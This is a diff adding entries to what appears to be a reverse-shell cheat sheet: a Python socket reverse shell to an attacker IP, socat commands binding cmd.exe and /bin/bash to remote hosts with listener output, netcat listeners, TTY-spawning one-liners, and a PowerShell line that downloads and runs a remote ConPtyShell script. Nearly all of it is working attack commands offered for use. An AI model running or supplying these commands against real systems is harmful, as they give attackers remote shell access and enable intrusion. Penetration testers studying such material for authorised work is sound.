@@ -320,6 +320,12 @@ powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubuse
 
 ### Python
 
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+```
+
+
 ### Ruby
 
 ```
@@ -333,6 +339,27 @@ ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(
 ```
 
 ### SoCat
+
+**Windows**
+```
+PS C:\Users\user> .\socat.exe TCP:192.168.119.134:443 EXEC:cmd.exe,pty,stderr,setsid,sigint,sane
+
+user@kali:~$ sudo socat TCP-LISTEN:443 STDOUT
+/bin/bash: line 2: $'\f\fcls': command not found
+2020/02/17 16:12:03 socat[12060] E waitpid(): child 12061 exited with status 127
+Microsoft Windows [Version 10.0.16299.15]
+(c) 2017 Microsoft Corporation. All rights reserved.
+
+C:\Users\user>
+```
+
+**Linux**
+```
+PS C:\Tools\useful_tools\socat> .\socat.exe -d -d TCP4-LISTEN:443 STDOUT
+2020/02/17 13:08:17 socat[796] N listening on AF=2 0.0.0.0:443
+
+user@kali:~/PWK2.0/4-useful-tools/socat$ sudo socat TCP:192.168.134.10:443,fork EXEC:/bin/bash
+```
 
 ### Telnet
 
@@ -355,3 +382,58 @@ strings reverse.war | grep jsp # in order to get the name of the file
 ```
 
 ### Spawn TTY Shell
+
+To catch a shell you need a listener on any port you desire as long as you know what it is such as:
+```
+rlwrap nc 10.0.0.1 4242
+
+rlwrap -r -f . nc 10.0.0.1 4242
+-f . will make rlwrap use the current history file as a completion word list.
+-r Put all words seen on in- and output on the completion list.
+
+```
+
+Spawn a TTY shell from an interpreter:
+
+```
+/bin/sh -i
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c "__import__('pty').spawn('/bin/bash')"
+python3 -c "__import__('subprocess').call(['/bin/bash'])"
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+perl -e 'print `/bin/bash`'
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+
+
+```
+
+Alternative method:
+
+```
+www-data@debian:/dev/shm$ su - user
+su: must be run from a terminal
+
+www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
+www-data@debian:/dev/shm$ su - user
+Password: P4ssW0rD
+
+user@debian:~$ 
+
+```
+
+**Create a fully interactive shell on Windows**
+
+Server side:
+```
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+
+```
+
+Client Side:
+```
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+
+
+```
